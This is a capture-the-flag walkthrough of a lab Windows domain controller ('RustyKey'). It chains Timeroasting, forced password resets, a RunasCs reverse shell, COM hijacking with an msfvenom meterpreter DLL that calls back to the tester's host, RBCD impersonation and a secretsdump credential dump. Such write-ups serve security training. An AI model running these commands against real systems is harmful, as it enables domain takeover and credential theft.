# Nmap
```
# Nmap 7.95 scan initiated Fri Jul 18 14:29:24 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.75
Nmap scan report for 10.10.11.75
Host is up (0.50s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 12:38:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1h58m49s
| smb2-time: 
|   date: 2025-07-18T12:39:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 18 14:38:29 2025 -- 1 IP address (1 host up) scanned in 545.19 seconds
```
Add the domain `rustykey.htb`and `dc.rustykey.htb` to our `/etc/hosts`

We have the credit of `rr.parker`
```
Machine Information

As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A
```

# Get TGT ticket
Since the default credentials cannot log in directly,
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A'                                                                                                          
SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.75     445    10.10.11.75      [-] 10.10.11.75\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED 
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A'
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED

```

We also need to fix the config of `/etc/krb5.conf `
```
/etc/krb5.conf 
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true

[realms]
    RUSTYKEY.HTB = {
        kdc = 10.10.11.75
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB

```

let's first obtain a `TGT` ticket for further enumeration.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache

┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=rr.parker.ccache   
```

Then we can enumerate the user list
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k --users
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.75     389    DC               Administrator                 2025-06-04 22:52:22 0        Built-in account for administering the computer/domain      
LDAP        10.10.11.75     389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.11.75     389    DC               krbtgt                        2024-12-27 00:53:40 0        Key Distribution Center Service Account                     
LDAP        10.10.11.75     389    DC               rr.parker                     2025-06-04 22:54:15 0                                                                    
LDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 10:18:39 0                                                                    
LDAP        10.10.11.75     389    DC               bb.morgan                     2025-07-18 12:46:40 0                                                                    
LDAP        10.10.11.75     389    DC               gg.anderson                   2025-07-18 12:46:40 0                                                                    
LDAP        10.10.11.75     389    DC               dd.ali                        2025-07-18 12:46:40 0                                                                    
LDAP        10.10.11.75     389    DC               ee.reed                       2025-07-18 12:46:40 0                                                                    
LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 11:34:50 0                                                                    
LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-30 00:30:18 0  
```

# Bloodhound by rr.parker
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ bloodhound-python  -u 'rr.parker' -p '8#t5HE8L!W3A' -k -d rustykey.htb -ns 10.10.11.75 -c ALl --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Done in 01M 44S
INFO: Compressing output into 20250718125224_bloodhound.zip
```
![](images/Pasted%20image%2020250718130405.png)
From the original account, there is nothing useful here.

# Timerosting.py
After asking other experts, I found that I could get the `NTP` hash of one of the hosts by `Timeroasting` to hash leak.
There is a blog to explain this exploit
`https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac`

```
The purpose of Timeroast is to:

Get accounts configured with "scheduled task" or "service logon" from the AD domain and extract their Kerberos TGT request (AS-REQ) tickets for offline cracking.

It exploits accounts in Windows that are set to use "Scheduled Task" or "Logon as a Service". Their Kerberos tickets have a special flag called RC4-HMAC tickets, which are easier to crack (similar to the early Kerberoasting attack).
```
There is also some restrictions
```
1. The target must be a computer account, and cannot be directly targeted at ordinary user accounts (unless "target Timeroasting" modifies the properties).
2. The target domain controller starts and responds to the NTP service with Microsoft SNTP Extended Authentication (MS-SNTP), and UDP port 123 is open.
3. The attacker can send unauthenticated MS-SNTP requests to the DC (no valid credentials are required).
4. The RID (relative identifier) of computer accounts in the domain can be enumerated.
5. (Optional) For "target Timeroasting", domain administrator privileges are required to temporarily modify the user account properties so that it is treated as a computer account.
6. The computer account passwords in the domain are not strongly protected (for example, weak passwords or not changed regularly).
```

So let's try it 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ python3 /opt/Timeroast/timeroast.py 10.10.11.75
1000:$sntp-ms$f96a8c27816bba79085ca65f2c3ee345$1c0111e900000000000a08214c4f434cec24bc09d67188d9e1b8428bffbfcd0aec24c6c21258e64bec24c6c21258fdc8
1103:$sntp-ms$c4a8e192375acff2f9462c9db952c84d$1c0111e900000000000a08224c4f434cec24bc09d4e1678ee1b8428bffbfcd0aec24c6c2b4e1536cec24c6c2b4e16ff2
1104:$sntp-ms$db769ec19fa13024ab7a29788b306f90$1c0111e900000000000a08224c4f434cec24bc09d495223be1b8428bffbfcd0aec24c6c2bc848d98ec24c6c2bc84d40f
1105:$sntp-ms$7e948d9ff6254e8e67decf59695b29f4$1c0111e900000000000a08224c4f434cec24bc09d5df6a5ee1b8428bffbfcd0aec24c6c2bdceeb8aec24c6c2bdcf18d7
1106:$sntp-ms$04db0a78f24acd6703b12c508d3c1df2$1c0111e900000000000a08224c4f434cec24bc09d5ec4b17e1b8428bffbfcd0aec24c6c2bddbcf9fec24c6c2bddbf635
1107:$sntp-ms$24eae73923fde0f3ec7d70f90c3e9fe6$1c0111e900000000000a08224c4f434cec24bc09d60420f6e1b8428bffbfcd0aec24c6c2bdf38e01ec24c6c2bdf3c8ba
1119:$sntp-ms$1f6dd540e72a49d4c2eb13108b5c11bf$1c0111e900000000000a08224c4f434cec24bc09d3982525e1b8428bffbfcd0aec24c6c2d3980bfaec24c6c2d398343e
1118:$sntp-ms$25b16e61a1a86d71835634d4528c6326$1c0111e900000000000a08224c4f434cec24bc09d3971a63e1b8428bffbfcd0aec24c6c2d396fc30ec24c6c2d39727cf
1120:$sntp-ms$1235de207ec07756bbf0c38b5f8bbbf9$1c0111e900000000000a08224c4f434cec24bc09d3b31cf8e1b8428bffbfcd0aec24c6c2d3b3057bec24c6c2d3b328b6
1121:$sntp-ms$0727e92ca523650dcff8b7a0f9562dec$1c0111e900000000000a08224c4f434cec24bc09d3b5ce83e1b8428bffbfcd0aec24c6c2d3b5b8b4ec24c6c2d3b5d894
1122:$sntp-ms$d0a3cebc740a84c18dbe95cc0627a55a$1c0111e900000000000a08224c4f434cec24bc09d3cf751de1b8428bffbfcd0aec24c6c2d3cf5da0ec24c6c2d3cf80dc
1123:$sntp-ms$2c0c6c5c56be815445e6f4e0b6d4b8a1$1c0111e900000000000a08224c4f434cec24bc09d36a4a20e1b8428bffbfcd0aec24c6c2d74132d0ec24c6c2d7416a2d
1124:$sntp-ms$b9f0ab8bfe72770728391d77231186ac$1c0111e900000000000a08224c4f434cec24bc09d36bc1efe1b8428bffbfcd0aec24c6c2d742b65dec24c6c2d742d63e
1125:$sntp-ms$2d816873fed791fcc22b0d6105468fda$1c0111e900000000000a08224c4f434cec24bc09d499cb17e1b8428bffbfcd0aec24c6c2dc8943e1ec24c6c2dc897990
1127:$sntp-ms$d4062e91595cb9d05656bd13ad571f29$1c0111e900000000000a08224c4f434cec24bc09d5deb024e1b8428bffbfcd0aec24c6c2ddce3806ec24c6c2ddce5994
1126:$sntp-ms$a640bb242f3d81ea0ca2abd0f3bd06c0$1c0111e900000000000a08224c4f434cec24bc09d5dde01ae1b8428bffbfcd0aec24c6c2ddcd58e3ec24c6c2ddcd9041
```

We need to use hashcat for blasting. We need to use the Beta version to successfully crack the password.
```
1125:$sntp-ms$d7e7fef91094a412a2e8cb82c7716f1a$1c0111e900000000000a10504c4f434cec0d09c52308c3f3e1b8428bffbfcd0aec0d1f46bb191728ec0d1f46bb193052:Rusty88!
```

We need to find the computer with Object-id `1125`, then you can find it from Bloodhound
![](images/Pasted%20image%2020250718131420.png)

We can continue to check his `First Degree Object Control`
![](images/Pasted%20image%2020250718131525.png)

That means we can add `It-computer3` to group `Helpdesk`, so let's exploit that
Firstly get the `TGT` key of `It-computer3`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ impacket-getTGT rustykey.htb/'IT-COMPUTER3$':'Rusty88!' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-COMPUTER3$.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=IT-COMPUTER3\$.ccache
```

# Into the group desktop
Then add itself to group
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```

Let's continue to check what can group `Helpdesk` can do
![](images/Pasted%20image%2020250718131936.png)
![](images/Pasted%20image%2020250718132307.png)
If we wanna get access to account `bb.morgan`, we need to remove it from `protected object`, then we can force change password of account`bb.morgan`

Let's exploit it step by step
Firstly, remove from `protected object`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT' 
[-] IT removed from PROTECTED OBJECTS
```
Then force change the password
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Abc123456@'
[+] Password changed successfully!
```

Then let's get the `TGT ticket` of `bb.morgan` and connect to machine by `evil-winrm`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ impacket-getTGT rustykey.htb/'bb.morgan':'Abc123456@'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache

┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ evil-winrm -i dc.rustykey.htb -u 'bb.morgan' -r rustykey.htb                             
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> 

```

There is a pdf file `internal.pdf` in the desktop 
![](images/Pasted%20image%2020250718134037.png)
That means the `SUPPORT` group has the right to modify the registry and can test compression/decompression related functions.

And also, `EE.REED` is in the group `Support`
![](images/Pasted%20image%2020250718134426.png)
We also need to do same thing to `EE.REED` like `BB.Morgan` before.

# Switch to account EE.REED
Firstly, remove from the `protected object`
PS: If you counter the error 
```
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=Protected Objects,CN=Users,DC=rustykey,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
```
Please obtain the `TGT` certificate of `IT-COMPUTER3` again

```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=/home/kali/RustyKey/IT-COMPUTER3\$.ccache

┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT' 
[-] SUPPORT removed from PROTECTED OBJECTS

```

Then let's force change the password and get the `TGT` golden ticket.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Abc123456@'                 
[+] Password changed successfully!
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ impacket-getTGT rustykey.htb/'ee.reed':'Abc123456@'     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=ee.reed.ccache       

```

But here we can't connect directly with evil-winrm
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ evil-winrm -i dc.rustykey.htb -u 'ee.reed' -r rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success  
```

We can use another way to get the shell of `ee.reed`

# Runascs.exe
Firstly, let's come back to shell of `bb.morgan` and upload the `Runascs.exe`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=bb.morgan.ccache                        
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ evil-winrm -i dc.rustykey.htb -u 'bb.morgan' -r rustykey.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> upload ../../../../../../../opt/RunasCs.exe
                                        
Info: Uploading /home/wither/Templates/htb-labs/RustyKey/../../../../../../../opt/RunasCs.exe to C:\Users\bb.morgan\Documents\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!

```

Then let's use the changed credit to get the reverse shell as `ee.reed`
```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> .\RunasCS.exe ee.reed Abc123456@ powershell.exe -r 10.10.14.17:443
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-7c556e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5528 created in background.
```
Then you can get the reverse shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.75] 58382
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
rustykey\ee.reed

```

# COM Hijack
Windows applications often call COM components through CLSID (Class ID), and the system will load the corresponding DLL or EXE according to the configuration in the registry. An attacker can: ​​Tamper with the registry entries of existing COM components​​ to point to malicious DLLs.

Since the registry is related to compression, let's first check the possible `CLSIDs`.
```
PS C:\> reg query HKCR\CLSID /s /f "zip"
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu

HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler

HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler

HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll

End of search: 14 match(es) found.
```

This 7-Zip is our target, because he mentioned the decompression and compression tool earlier

Let's use `msfvenom` to create a malicious ddl file 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f dll -o wither.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: wither.dll
```

Let's upload it and modify the registry table
```
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Programdata\wither.dll" /f
```

Then we can get the reverse shell from `msfconsole` 
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Sending stage (203846 bytes) to 10.10.11.75
[*] Meterpreter session 2 opened (10.10.14.17:4444 -> 10.10.11.75:58436) at 2025-07-18 14:07:06 +0000

meterpreter > getuid
Server username: RUSTYKEY\mm.turner

```

# AddAllowedToAct
Let's come back our bloodhound to check the account `mm.turner`
![](images/Pasted%20image%2020250718140904.png)
![](images/Pasted%20image%2020250718140946.png)
```
AddAllowedToAct, a write permission on an object’s msDS-Allowed-To-Act-On-Behalf-Of-Other-Identity attribute, for Kerberos RBCD attacks When an attacker has the AddAllowedToAct permission, they can add delegated permissions to themselves or a controlled account, thereby performing identity impersonation attacks (S4U2self/S4U2proxy).
```
So When receiving `meterpreter`, you can set `IT-COMPUTER$3` to pretend to be a DC and then perform `RBCD` attack
![](images/Pasted%20image%2020250718141227.png)
`Backupadmin` is our target to `DCsync` `Rustykey.htb`

So let's exploit them
**meterpreter**
```
C:\Windows>powershell.exe
powershell.exe
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
PS C:\Windows> 
```

Then obtained the access ticket of `backupadmin` through `Kerberos` delegation (`S4U`)
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=IT-COMPUTER3\$.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

We can even dump the administrator hash
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/RustyKey]
└─$ impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
[*] DefaultPassword 
RUSTYKEY\Administrator:Rustyrc4key#!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
[*] NL$KM 
 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4
 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.{v.
 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..
 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....{.o.....
NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::
Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::
Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::
Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::
Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::
Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::
Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::
Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::
